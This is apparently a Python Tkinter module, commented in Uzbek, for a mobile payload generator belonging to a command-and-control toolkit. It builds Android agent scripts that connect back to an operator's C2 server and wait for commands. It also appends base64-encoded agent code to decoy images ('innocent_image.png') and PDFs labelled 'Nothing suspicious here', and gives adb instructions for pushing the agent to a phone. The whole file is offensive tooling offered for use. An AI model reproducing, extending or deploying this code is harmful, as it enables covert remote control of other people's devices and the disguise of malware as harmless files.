"""
Mobile Payload Generator Module - Android Agent Yaratish
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import os
import base64
from datetime import datetime
try:
    from PIL import Image
except ImportError:
    Image = None


class MobilePayloadGenerator:
    """Android payload generator"""
    
    def __init__(self, parent, log_callback=None):
        self.parent = parent
        self.log = log_callback or print
        
    def show_generator(self):
        """Payload generator oynasi"""
        try:
            window = tk.Toplevel(self.parent)
            window.title("📱 Android Payload Generator")
            window.geometry("800x600")
            window.configure(bg='#1e1e1e')
            
            # Title
            tk.Label(
                window,
                text="📱 Android Agent Generator",
                bg='#1e1e1e',
                fg='#00ff00',
                font=('Consolas', 16, 'bold')
            ).pack(pady=15)
            
            # Info
            tk.Label(
                window,
                text="Telefon uchun C2 agent yaratish",
                bg='#1e1e1e',
                fg='#888888',
                font=('Consolas', 10)
            ).pack(pady=5)
            
            # Tabs for different formats
            style = ttk.Style()
            style.theme_use('default')
            style.configure('TNotebook', background='#1e1e1e', borderwidth=0)
            style.configure('TNotebook.Tab', background='#2d2d2d', foreground='#00ff00', 
                          padding=[20, 10], font=('Consolas', 11, 'bold'))
            style.map('TNotebook.Tab', background=[('selected', '#00ff00')], 
                     foreground=[('selected', '#000000')])
            
            notebook = ttk.Notebook(window)
            notebook.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
            
            # Tab 1: Python Script
            tab_python = tk.Frame(notebook, bg='#2d2d2d')
            notebook.add(tab_python, text="  📄 Python  ")
            
            # Tab 2: APK
            tab_apk = tk.Frame(notebook, bg='#2d2d2d')
            notebook.add(tab_apk, text="  📦 APK  ")
            
            # Tab 3: Image Stego
            tab_image = tk.Frame(notebook, bg='#2d2d2d')
            notebook.add(tab_image, text="  🖼️ Image  ")
            
            # Tab 4: PDF Stego
            tab_pdf = tk.Frame(notebook, bg='#2d2d2d')
            notebook.add(tab_pdf, text="  📕 PDF  ")
            
            # Create tabs
            self._create_python_tab(tab_python)
            self._create_apk_tab(tab_apk)
            self._create_image_tab(tab_image)
            self._create_pdf_tab(tab_pdf)
            
            self.log("📱 Mobile payload generator ochildi")
            
        except Exception as e:
            self.log(f"❌ Error: {e}")
            messagebox.showerror("Xato", f"Generator xatosi:\n{e}")
    
    def _create_python_tab(self, parent):
        """Python script tab"""
        config_frame = tk.Frame(parent, bg='#2d2d2d')
        config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Server IP
        tk.Label(
            config_frame,
            text="C2 Server IP:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 11, 'bold')
        ).grid(row=0, column=0, sticky='w', padx=10, pady=10)
        
        ip_entry = tk.Entry(
            config_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 11),
            width=30
        )
        ip_entry.insert(0, "192.168.1.100")
        ip_entry.grid(row=0, column=1, padx=10, pady=10)
        
        # Port
        tk.Label(
            config_frame,
            text="Server Port:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 11, 'bold')
        ).grid(row=1, column=0, sticky='w', padx=10, pady=10)
        
        port_entry = tk.Entry(
            config_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 11),
            width=30
        )
        port_entry.insert(0, "9999")
        port_entry.grid(row=1, column=1, padx=10, pady=10)
        
        # Generate button
        tk.Button(
            config_frame,
            text="🚀 Generate Python Agent",
            command=lambda: self._generate_python_payload(ip_entry.get(), port_entry.get()),
            bg='#00ff00',
            fg='#000000',
            font=('Consolas', 12, 'bold'),
            width=30,
            height=2
        ).grid(row=2, column=0, columnspan=2, pady=20)
    
    def _create_apk_tab(self, parent):
        """APK tab"""
        config_frame = tk.Frame(parent, bg='#2d2d2d')
        config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(
            config_frame,
            text="📦 Android APK Builder",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 14, 'bold')
        ).pack(pady=10)
        
        tk.Label(
            config_frame,
            text="Buildozer orqali APK yaratish (PC'da ishlatiladi)",
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 10)
        ).pack(pady=5)
        
        # Requirements
        req_frame = tk.Frame(config_frame, bg='#1e1e1e', relief=tk.SUNKEN, bd=2)
        req_frame.pack(fill=tk.X, padx=20, pady=10)
        
        requirements = """
Talablar:
• Linux/MacOS (yoki WSL)
• Python 3.8+
• Buildozer: pip install buildozer
• Java JDK
• Android SDK & NDK

Birinchi build: 10-30 daqiqa
        """
        
        tk.Label(
            req_frame,
            text=requirements,
            bg='#1e1e1e',
            fg='#ffaa00',
            font=('Consolas', 9),
            justify=tk.LEFT
        ).pack(pady=10, padx=10)
        
        # Build button
        tk.Button(
            config_frame,
            text="📦 Build APK (Advanced)",
            command=self._build_apk,
            bg='#ff6600',
            fg='#ffffff',
            font=('Consolas', 12, 'bold'),
            width=30,
            height=2
        ).pack(pady=20)
    
    def _create_image_tab(self, parent):
        """Image steganography tab"""
        config_frame = tk.Frame(parent, bg='#2d2d2d')
        config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(
            config_frame,
            text="🖼️ Image Steganography",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 14, 'bold')
        ).pack(pady=10)
        
        tk.Label(
            config_frame,
            text="Agent'ni PNG/JPG rasm ichiga yashirish",
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 10)
        ).pack(pady=5)
        
        # Select image
        img_frame = tk.Frame(config_frame, bg='#2d2d2d')
        img_frame.pack(pady=10)
        
        tk.Label(
            img_frame,
            text="Cover Image:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 11, 'bold')
        ).pack(side=tk.LEFT, padx=5)
        
        self.image_entry = tk.Entry(
            img_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 10),
            width=30
        )
        self.image_entry.pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            img_frame,
            text="📁 Browse",
            command=lambda: self._browse_file(self.image_entry, [("Images", "*.png *.jpg *.jpeg")]),
            bg='#555555',
            fg='#ffffff',
            font=('Consolas', 10)
        ).pack(side=tk.LEFT, padx=5)
        
        # Instructions
        info = """
Qanday ishlaydi:
1. Oddiy rasm tanlanadi (PNG/JPG)
2. Agent code rasm oxiriga qo'shiladi
3. Rasm normal ochiladi, lekin ichida agent bor
4. Telefonda extract qilish uchun maxsus script kerak
        """
        
        tk.Label(
            config_frame,
            text=info,
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 9),
            justify=tk.LEFT
        ).pack(pady=10)
        
        # Generate button
        tk.Button(
            config_frame,
            text="🎨 Hide Payload in Image",
            command=self._hide_in_image,
            bg='#00ff00',
            fg='#000000',
            font=('Consolas', 12, 'bold'),
            width=30,
            height=2
        ).pack(pady=20)
    
    def _create_pdf_tab(self, parent):
        """PDF steganography tab"""
        config_frame = tk.Frame(parent, bg='#2d2d2d')
        config_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(
            config_frame,
            text="📕 PDF Steganography",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 14, 'bold')
        ).pack(pady=10)
        
        tk.Label(
            config_frame,
            text="Agent'ni PDF document ichiga yashirish",
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 10)
        ).pack(pady=5)
        
        # PDF title
        title_frame = tk.Frame(config_frame, bg='#2d2d2d')
        title_frame.pack(pady=10)
        
        tk.Label(
            title_frame,
            text="PDF Title:",
            bg='#2d2d2d',
            fg='#00ff00',
            font=('Consolas', 11, 'bold')
        ).pack(side=tk.LEFT, padx=5)
        
        self.pdf_title_entry = tk.Entry(
            title_frame,
            bg='#1e1e1e',
            fg='#00ff00',
            font=('Consolas', 10),
            width=35
        )
        self.pdf_title_entry.insert(0, "Important Document")
        self.pdf_title_entry.pack(side=tk.LEFT, padx=5)
        
        # Instructions
        info = """
Qanday ishlaydi:
1. Normal PDF yaratiladi
2. Agent code PDF oxiriga qo'shiladi (base64)
3. PDF normal ochiladi va o'qiladi
4. Telefonda extract qilish uchun script kerak

Requires: pip install reportlab
        """
        
        tk.Label(
            config_frame,
            text=info,
            bg='#2d2d2d',
            fg='#888888',
            font=('Consolas', 9),
            justify=tk.LEFT
        ).pack(pady=10)
        
        # Generate button
        tk.Button(
            config_frame,
            text="📄 Create PDF with Payload",
            command=self._create_pdf_payload,
            bg='#00ff00',
            fg='#000000',
            font=('Consolas', 12, 'bold'),
            width=30,
            height=2
        ).pack(pady=20)
    
    def _browse_output(self, entry):
        """Output file tanlash"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")],
            initialfile=entry.get()
        )
        if filename:
            entry.delete(0, tk.END)
            entry.insert(0, filename)
    
    def _generate_payload(self, server_ip, server_port, output_file, features):
        """Payload generatsiya qilish"""
        def generate_thread():
            try:
                self.log(f"🚀 Generating Android agent...")
                self.log(f"   Server: {server_ip}:{server_port}")
                
                # Validate inputs
                if not server_ip:
                    messagebox.showerror("Xato", "Server IP kiriting!")
                    return
                
                try:
                    port = int(server_port)
                except:
                    messagebox.showerror("Xato", "Port raqam bo'lishi kerak!")
                    return
                
                # Generate agent code
                agent_code = self._build_agent_code(server_ip, port, features)
                
                # Save to file
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(agent_code)
                
                self.log(f"✅ Agent yaratildi: {output_file}")
                
                # Show success dialog
                messagebox.showinfo(
                    "Tayyor!",
                    f"✅ Android agent yaratildi!\n\n"
                    f"📂 File: {output_file}\n"
                    f"🌐 Server: {server_ip}:{port}\n\n"
                    f"Telefonga o'tkazish:\n"
                    f"adb push {output_file} /sdcard/\n\n"
                    f"Ishga tushirish:\n"
                    f"python /sdcard/{os.path.basename(output_file)}"
                )
                
            except Exception as e:
                self.log(f"❌ Generation error: {e}")
                messagebox.showerror("Xato", f"Generation xatosi:\n{e}")
        
        thread = threading.Thread(target=generate_thread, daemon=True)
        thread.start()
    
    def _build_agent_code(self, server_ip, server_port, features):
        """Agent code qurish"""
        
        # Import mobile_agent.py template
        template_path = os.path.join('agent', 'mobile_agent.py')
        
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                code = f.read()
            
            # Replace placeholders
            code = code.replace('YOUR_C2_SERVER_IP', server_ip)
            code = code.replace('9999', str(server_port))
            
            return code
        else:
            # Fallback - simple agent
            return f'''"""
Android Mobile Agent
Server: {server_ip}:{server_port}
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

import socket
import json
import time

SERVER_HOST = "{server_ip}"
SERVER_PORT = {server_port}

def main():
    print("Connecting to C2 server...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_HOST, SERVER_PORT))
    
    print(f"Connected to {{SERVER_HOST}}:{{SERVER_PORT}}")
    
    # Send device info
    device_info = {{
        "type": "ANDROID",
        "hostname": socket.gethostname()
    }}
    
    sock.send(json.dumps(device_info).encode() + b'\\n')
    
    # Main loop
    while True:
        try:
            data = sock.recv(4096).decode()
            if data:
                print(f"Command: {{data}}")
                # Process command here
                
            time.sleep(0.1)
        except KeyboardInterrupt:
            break
    
    sock.close()

if __name__ == "__main__":
    main()
'''
    
    def _browse_file(self, entry, filetypes):
        """File tanlash"""
        filename = filedialog.askopenfilename(filetypes=filetypes)
        if filename:
            entry.delete(0, tk.END)
            entry.insert(0, filename)
    
    def _generate_python_payload(self, server_ip, server_port):
        """Python agent generatsiya"""
        def generate_thread():
            try:
                if not server_ip:
                    messagebox.showerror("Xato", "Server IP kiriting!")
                    return
                
                template_path = os.path.join('agent', 'mobile_agent.py')
                
                if os.path.exists(template_path):
                    with open(template_path, 'r', encoding='utf-8') as f:
                        code = f.read()
                    
                    code = code.replace('YOUR_C2_SERVER_IP', server_ip)
                    code = code.replace('9999', str(server_port))
                else:
                    code = f"""# Android Agent - {server_ip}:{server_port}
import socket, json, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('{server_ip}', {server_port}))

while True:
    data = sock.recv(4096).decode()
    if data:
        print(f"Command: {{data}}")
    time.sleep(0.1)
"""
                
                output_file = filedialog.asksaveasfilename(
                    defaultextension=".py",
                    filetypes=[("Python files", "*.py")],
                    initialfile=f"mobile_agent_{datetime.now().strftime('%Y%m%d')}.py"
                )
                
                if output_file:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(code)
                    
                    self.log(f"✅ Python agent yaratildi: {output_file}")
                    messagebox.showinfo(
                        "Tayyor!",
                        f"✅ Agent yaratildi!\n\n{output_file}\n\n"
                        f"Telefonga o'tkazish:\nadb push {os.path.basename(output_file)} /sdcard/"
                    )
                    
            except Exception as e:
                self.log(f"❌ Error: {e}")
                messagebox.showerror("Xato", str(e))
        
        threading.Thread(target=generate_thread, daemon=True).start()
    
    def _build_apk(self):
        """APK build"""
        messagebox.showinfo(
            "APK Builder",
            "APK build qilish uchun:\n\n"
            "1. Linux/MacOS/WSL kerak\n"
            "2. Buildozer o'rnatish:\n   pip install buildozer\n\n"
            "3. Project papkasida:\n   buildozer android debug\n\n"
            "Script: scripts/android_apk_builder.py\n"
            "Birinchi build: 10-30 daqiqa"
        )
        self.log("ℹ️ APK build guide ko'rsatildi")
    
    def _hide_in_image(self):
        """Image'ga payload yashirish"""
        def hide_thread():
            try:
                if not Image:
                    messagebox.showerror("Xato", "PIL kutubxonasi kerak!\npip install pillow")
                    return
                
                image_file = self.image_entry.get()
                if not image_file or not os.path.exists(image_file):
                    messagebox.showerror("Xato", "Rasm file tanlang!")
                    return
                
                # Get agent code
                agent_file = os.path.join('agent', 'mobile_agent.py')
                if not os.path.exists(agent_file):
                    messagebox.showerror("Xato", "mobile_agent.py topilmadi!")
                    return
                
                with open(agent_file, 'rb') as f:
                    agent_data = f.read()
                
                # Read image
                with open(image_file, 'rb') as f:
                    image_data = f.read()
                
                # Combine
                delimiter = b'|||PAYLOAD_START|||'
                combined = image_data + delimiter + base64.b64encode(agent_data)
                
                # Save output
                output_file = filedialog.asksaveasfilename(
                    defaultextension=".png",
                    filetypes=[("PNG files", "*.png"), ("JPEG files", "*.jpg")],
                    initialfile="innocent_image.png"
                )
                
                if output_file:
                    with open(output_file, 'wb') as f:
                        f.write(combined)
                    
                    self.log(f"✅ Payload yashirildi: {output_file}")
                    messagebox.showinfo(
                        "Tayyor!",
                        f"✅ Payload rasm ichiga yashirildi!\n\n"
                        f"📂 {output_file}\n\n"
                        f"Rasm normal ochiladi, lekin\n"
                        f"ichida agent code bor.\n\n"
                        f"Extract qilish:\n"
                        f"scripts/payload_steganography.py"
                    )
                    
            except Exception as e:
                self.log(f"❌ Error: {e}")
                messagebox.showerror("Xato", str(e))
        
        threading.Thread(target=hide_thread, daemon=True).start()
    
    def _create_pdf_payload(self):
        """PDF payload yaratish"""
        def pdf_thread():
            try:
                try:
                    from reportlab.pdfgen import canvas
                    from reportlab.lib.pagesizes import letter
                except ImportError:
                    messagebox.showerror(
                        "Xato",
                        "reportlab kutubxonasi kerak!\n\n"
                        "O'rnatish:\npip install reportlab"
                    )
                    return
                
                # Get agent code
                agent_file = os.path.join('agent', 'mobile_agent.py')
                if not os.path.exists(agent_file):
                    messagebox.showerror("Xato", "mobile_agent.py topilmadi!")
                    return
                
                with open(agent_file, 'rb') as f:
                    agent_data = f.read()
                
                # Get output file
                output_file = filedialog.asksaveasfilename(
                    defaultextension=".pdf",
                    filetypes=[("PDF files", "*.pdf")],
                    initialfile="document.pdf"
                )
                
                if not output_file:
                    return
                
                # Create PDF
                title = self.pdf_title_entry.get() or "Document"
                c = canvas.Canvas(output_file, pagesize=letter)
                
                # Add content
                c.setFont("Helvetica", 16)
                c.drawString(100, 750, title)
                
                c.setFont("Helvetica", 12)
                c.drawString(100, 700, "This is a legitimate document.")
                c.drawString(100, 680, "Nothing suspicious here.")
                c.drawString(100, 640, "Just a regular PDF file.")
                
                c.save()
                
                # Append payload
                delimiter = b'|||PAYLOAD_START|||'
                with open(output_file, 'ab') as f:
                    f.write(delimiter)
                    f.write(base64.b64encode(agent_data))
                
                self.log(f"✅ PDF payload yaratildi: {output_file}")
                messagebox.showinfo(
                    "Tayyor!",
                    f"✅ PDF payload yaratildi!\n\n"
                    f"📂 {output_file}\n\n"
                    f"PDF normal ochiladi va o'qiladi,\n"
                    f"lekin ichida agent code bor.\n\n"
                    f"Extract qilish:\n"
                    f"scripts/payload_steganography.py"
                )
                
            except Exception as e:
                self.log(f"❌ Error: {e}")
                messagebox.showerror("Xato", str(e))
        
        threading.Thread(target=pdf_thread, daemon=True).start()
